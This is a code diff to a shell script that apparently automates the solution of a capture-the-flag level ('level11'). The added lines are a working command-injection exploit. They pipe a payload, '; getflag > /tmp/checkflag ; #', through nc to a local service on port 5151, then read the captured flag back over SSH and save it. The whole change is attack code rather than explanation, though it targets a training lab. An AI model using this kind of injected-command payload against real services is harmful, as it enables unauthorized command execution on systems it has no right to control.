@@ -113,17 +113,14 @@ main() {
     flag11_password="";
 
     init_ssh_socket "$level11_socket_path" "$host" "$port" "$level11_username" "$level11_password";
-    ssh_exec_via_socket "$level11_socket_path" "$host" "$port" "$level11_username" "echo 'Hello world !'";
+    ssh_exec_via_socket "$level11_socket_path" "$host" "$port" "$level11_username" "echo '; getflag > /tmp/checkflag ; #' | nc localhost 5151";
+    checkflag=$(ssh_exec_via_socket "$level11_socket_path" "$host" "$port" "$level11_username" "cat /tmp/checkflag" | head -n 1 | awk  '{print $NF}');
     close_ssh_socket "$level11_socket_path" "$host" "$port" "$level11_username";
 
-    # init_ssh_socket "$flag11_socket_path" "$host" "$port" "$flag11_username" "$flag11_password";
-    # checkflag_str=$(ssh_exec_via_socket "$flag11_socket_path" "$host" "$port" "$flag11_username" "getflag");
-    # checkflag=$(echo -n "$checkflag_str" | head -n 1 | awk  '{print $NF}');
-    # close_ssh_socket "$flag11_socket_path" "$host" "$port" "$flag11_username";
 
-    # flag_outpath="$CURR_DIR_PATH/../flag";
-    # echo "Checkflag: $checkflag";
-    # echo -n "$checkflag" > "$flag_outpath";
+    flag_outpath="$CURR_DIR_PATH/../flag";
+    echo "Checkflag: $checkflag";
+    echo -n "$checkflag" > "$flag_outpath";
 }
 
 main "$@";
